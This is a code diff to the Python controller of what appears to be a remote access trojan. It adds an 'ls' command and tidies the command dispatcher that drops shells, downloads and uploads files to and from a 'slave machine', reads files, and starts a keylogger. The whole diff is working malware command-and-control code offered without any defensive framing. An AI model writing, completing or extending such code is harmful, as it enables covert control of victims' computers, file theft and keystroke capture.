@@ -5,6 +5,7 @@ from socket import error as socket_error
 
 from .crypto import crypto_run
 
+
 # hold strong shell on one connection
 # then expand for multi pool + current shell
 
@@ -57,19 +58,19 @@ def builtin_cmds(conn, cmd, shell_port, status):
         cmd += str(shell_port)
         conn = send_cmd(conn, cmd)
         status = drop_shell(shell_port, status)
-
+    elif cmd[:2] == "ls":
+        conn = send_cmd(conn, cmd)
+        conn, msg = recv_msg(conn, 64000)
     elif cmd[:5] == "clear":
         system("clear")
         msg = "ACK\n"
     elif cmd[:4] == "exit":
-
         status = 1
     elif cmd[:2] == "dl":
         conn = send_cmd(conn, cmd)
         conn, msg = recv_msg(conn, 64000)
         with open("dump/"+str(cmd)[3:], "w") as fp:
                 fp.write(msg[3:])
-
     elif cmd[:2] == "pl":
         conn = send_cmd(conn, cmd[:2])
         system("clear")
@@ -80,21 +81,19 @@ def builtin_cmds(conn, cmd, shell_port, status):
             data = fp.read()
             conn = send_cmd(conn, data)
             msg = "[+] File uploaded to slave machine"
-
     elif cmd[:3] == "cat":
         filename = cmd[3:]
         conn = send_cmd(conn, cmd)
         conn, msg = recv_msg(conn, 64000)
-
     elif cmd[:6] == "keylog":
         # run keylogger command
         conn = send_cmd(conn, cmd[:6])
         conn, msg = recv_msg(conn, 4096)
-
     else:
         # conn = send_cmd(conn, cmd)
-        builtin_cmds(conn, cmd, shell_port, status)
-    return conn, status, msg, status
+        # builtin_cmds(conn, cmd, shell_port, status)
+        msg = "[x] Command not found"
+    return conn, status, msg
 
 def validate_msg(msg):
     slave_ack = msg[:3]
@@ -117,7 +116,7 @@ def display_response(conn, msg):
 def cmd_shell(conn, shell_port, status):
     while status != 1:
         cmd = get_cmd()
-        conn, status, msg, status = builtin_cmds(conn, cmd, shell_port, status)
+        conn, status, msg = builtin_cmds(conn, cmd, shell_port, status)
         conn = display_response(conn, msg)
 
 
